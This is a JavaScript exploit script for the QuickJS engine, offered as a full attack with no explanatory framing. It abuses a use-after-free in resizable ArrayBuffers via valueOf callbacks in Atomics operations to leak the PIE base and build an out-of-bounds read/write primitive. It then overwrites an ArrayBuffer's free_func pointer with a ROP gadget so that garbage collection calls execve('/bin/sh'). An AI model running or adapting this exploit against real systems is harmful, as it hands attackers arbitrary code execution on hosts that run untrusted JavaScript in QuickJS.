// QuickJS UAF Exploit v20 - Shell execution via call [rdx] gadget
// Gadget at 0x36736: lea 0x20(%rdx),%rdi; call *(%rdx)
// This sets rdi = rdx + 32, then calls [rdx]
// Layout: data[0..7] = execve@plt, data[32..39] = "/bin/sh\0"
// Result: execve("/bin/sh", opaque=NULL, envp=data)

const JS_ARRAY_BUFFER_FREE = 0x14bc0n;
const EXECVE_PLT = 0x11410n;
const GADGET_LEA_RDI_CALL_RDX = 0x36736n;

let all_refs = [];

// ============ STAGE 1: PIE LEAK ============
print("[*] QuickJS UAF Exploit v20 - Shell Execution");

let pie_base = 0n;
{
    let ab = new ArrayBuffer(56, { maxByteLength: 256 });
    let view = new BigUint64Array(ab);
    all_refs.push(ab);

    let mal = {
        valueOf: () => {
            ab.resize(256);
            for(let i=0; i<100; i++) all_refs.push(new ArrayBuffer(128));
            return 0n;
        }
    };

    let r = Atomics.add(view, 6, mal);
    pie_base = (r >= 0n ? r : (0xffffffffffffffffn + r + 1n)) - JS_ARRAY_BUFFER_FREE;
    print("[+] PIE base: 0x" + pie_base.toString(16));
}

let execve_plt = pie_base + EXECVE_PLT;
let gadget = pie_base + GADGET_LEA_RDI_CALL_RDX;

print("[+] execve@plt: 0x" + execve_plt.toString(16));
print("[+] Gadget: 0x" + gadget.toString(16));

// ============ STAGE 2: CREATE VICTIMS WITH PAYLOAD ============
print("\n[*] Stage 2: Creating victims with shell payload...");

// Create many victims with the shell payload structure:
// data[0..7]   = execve@plt
// data[8..31]  = padding
// data[32..39] = "/bin/sh\0"

let targets = [];
for (let i = 0; i < 1000; i++) {
    let buf = new ArrayBuffer(64);
    let v = new BigUint64Array(buf);
    v[0] = execve_plt;          // [0..7] = execve@plt (for call [rdx])
    // [8..31] padding
    v[4] = 0x0068732f6e69622fn; // [32..39] = "/bin/sh\0" (for rdi = rdx+32)
    targets.push({buf: buf, view: v});
    all_refs.push(buf);
}

print("[+] Created " + targets.length + " victims");

// ============ STAGE 3: CREATE OOB PRIMITIVE ============
print("\n[*] Stage 3: Creating OOB primitive...");

{
    let ab = new ArrayBuffer(56, { maxByteLength: 256 });
    let view = new BigInt64Array(ab);
    all_refs.push(ab);

    let mal = {
        valueOf: () => {
            ab.resize(256);
            for(let i=0; i<400; i++) {
                let buf = new ArrayBuffer(64);
                let v = new BigUint64Array(buf);
                v[0] = execve_plt;
                v[4] = 0x0068732f6e69622fn;
                targets.push({buf: buf, view: v});
                all_refs.push(buf);
            }
            return 0xffffffff00010000n;  // 64KB OOB
        }
    };

    Atomics.exchange(view, 0, mal);
}

// Find OOB buffer
let oob_view = null;
let oob_target_idx = -1;
for (let i = 0; i < targets.length; i++) {
    try {
        if (targets[i].buf.byteLength > 30000) {
            oob_view = new BigUint64Array(targets[i].buf);
            oob_target_idx = i;
            break;
        }
    } catch (e) {}
}

if (!oob_view) {
    print("[-] No OOB buffer found");
    throw new Error("Failed");
}

print("[+] OOB buffer at target index " + oob_target_idx + ", length " + oob_view.length);

// ============ STAGE 4: FIND AND MODIFY VICTIM ============
print("\n[*] Stage 4: Finding victim JSArrayBuffer structures...");

// Find free_func pointers (js_array_buffer_free)
let victims = [];
for (let i = 6; i < oob_view.length - 1; i++) {
    let v;
    try { v = oob_view[i]; } catch (e) { break; }

    if (v === pie_base + JS_ARRAY_BUFFER_FREE) {
        // Found free_func at index i
        // Structure starts at i-6
        let start = i - 6;
        if (start >= 0) {
            let data_ptr = oob_view[start + 2];
            victims.push({
                start: start,
                free_func_idx: i,
                data_ptr: data_ptr
            });
        }
    }
}

print("[+] Found " + victims.length + " victim structures");

if (victims.length < 2) {
    print("[-] Not enough victims");
    throw new Error("Failed");
}

// Pick a victim to modify (not the first one which might be special)
let victim = victims[victims.length - 1];
print("[+] Target victim: struct@" + victim.start + ", data@0x" + victim.data_ptr.toString(16));

// ============ STAGE 5: OVERWRITE FREE_FUNC WITH GADGET ============
print("\n[*] Stage 5: Overwriting free_func with gadget...");

// Overwrite free_func with our gadget
oob_view[victim.free_func_idx] = gadget;

// Verify
let verify = oob_view[victim.free_func_idx];
if (verify !== gadget) {
    print("[-] Write verification failed!");
    print("[-] Expected: 0x" + gadget.toString(16));
    print("[-] Got: 0x" + verify.toString(16));
} else {
    print("[+] Successfully wrote gadget to free_func");
    print("[+] free_func = 0x" + gadget.toString(16));
}

// ============ STAGE 6: TRIGGER SHELL ============
print("\n[*] Stage 6: Triggering shell execution via GC...");
print("[*] When victim buffer is finalized, it will call:");
print("[*]   gadget -> rdi = data+32 = '/bin/sh', call [data+0] = execve@plt");
print("[*]   execve('/bin/sh', NULL, envp)");

// Clear references to trigger GC on our victims
let keep = all_refs.slice(0, 5);
all_refs.length = 0;
all_refs = keep;
targets.length = 0;

// Force GC
for (let i = 0; i < 30; i++) {
    for (let j = 0; j < 100000; j++) {
        let x = {};
    }
}

print("[*] If shell didn't spawn, execve may have failed");
print("[*] Check if the payload data is correct");
